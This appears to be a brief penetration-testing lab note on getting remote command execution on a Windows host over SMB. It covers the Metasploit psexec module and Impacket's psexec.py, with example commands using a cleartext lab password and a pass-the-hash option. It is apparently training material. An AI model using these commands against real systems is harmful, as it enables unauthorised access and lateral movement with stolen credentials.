- **Using Metasploit (More Noisy)**
---
- `use exploit/windows/smb/psexec` with a password:
	- ![[Pasted image 20250328160345.png]]
- use `exploit/windows/smb/psexec` with a hash:
	 ![[Pasted image 20250328160437.png]]
	 

- **Using `psexec.py (Less Noisy)`**
---
- `psexec.py marvel.local/fcastle:'Password1'@10.0.0.25`
	- ![[Pasted image 20250328160642.png]]
- `psexec.py fcastle@10.0.0.25 -hashes <hash_of_user>`
	- ![[Pasted image 20250328160830.png]]
